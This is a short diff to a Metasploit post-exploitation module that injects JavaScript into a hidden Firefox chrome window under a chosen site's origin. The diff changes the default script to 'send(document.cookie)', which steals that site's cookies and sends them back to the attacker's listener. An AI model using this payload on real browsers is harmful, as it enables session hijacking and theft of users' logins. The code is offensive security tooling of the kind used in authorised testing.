@@ -13,11 +13,7 @@ class Metasploit3 < Msf::Post
         This module runs the provided SCRIPT as javascript in the
         origin of the provided URL. It works by navigating a hidden
         ChromeWindow to the URL, then injecting the SCRIPT with Function.
-
-        The value returned by SCRIPT is sent back to the Metasploit instance.
-        The callback "send(result)" can also be used to return data for
-        asynchronous scripts.
-
+        The callback "send(result)" is used to send data back to the listener.
       },
       'License'       => MSF_LICENSE,
       'Author'        => [ 'joev' ],
@@ -25,7 +21,7 @@ class Metasploit3 < Msf::Post
     ))
 
     register_options([
-      OptString.new('SCRIPT', [true, "The javascript command to run", 'return document.cookie']),
+      OptString.new('SCRIPT', [true, "The javascript command to run", 'send(document.cookie)']),
       OptPath.new('SCRIPTFILE', [false, "The javascript file to run"]),
       OptString.new('URL', [
         true, "URL to inject into", 'http://metasploit.com'
